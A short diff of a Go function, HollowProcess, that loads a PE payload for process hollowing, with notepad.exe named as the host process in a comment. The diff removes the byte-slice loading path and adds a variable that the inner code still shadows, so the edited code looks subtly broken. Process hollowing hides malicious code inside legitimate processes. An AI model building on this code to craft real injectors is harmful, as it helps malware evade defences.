@@ -7,19 +7,16 @@ import (
 )
 
 //HollowProcess func
-func HollowProcess(payloadPath, targetPath string, payloadByte []byte ,arguments string) bool {
+func HollowProcess(payloadPath, targetPath string, payloadByte []byte, arguments string) bool {
 	//payloadPath := `test.exe`
 	//targetPath := `C:\Windows\SysWOW64\notepad.exe`
 
 	//1. Load the payload:
 	var payloadImageSize uint64
+	var loadedPE uintptr
 	// Load the current executable from the file with the help of libpeconv:
 	if payloadByte == nil {
 		loadedPE := LoadPEModule(payloadPath, &payloadImageSize, false, false)
-		fmt.Printf("Loaded_PE size: %d\n", payloadImageSize)
-		fmt.Printf("Loaded_PE ptr: %X\n", loadedPE)
-	} else {
-		loadedPE := LoadPEModuleByte(payloadByte, &payloadImageSize)
 		fmt.Printf("Loaded_PE size: %d\n", payloadImageSize)
 		fmt.Printf("Loaded_PE ptr: %X\n", loadedPE)
 	}
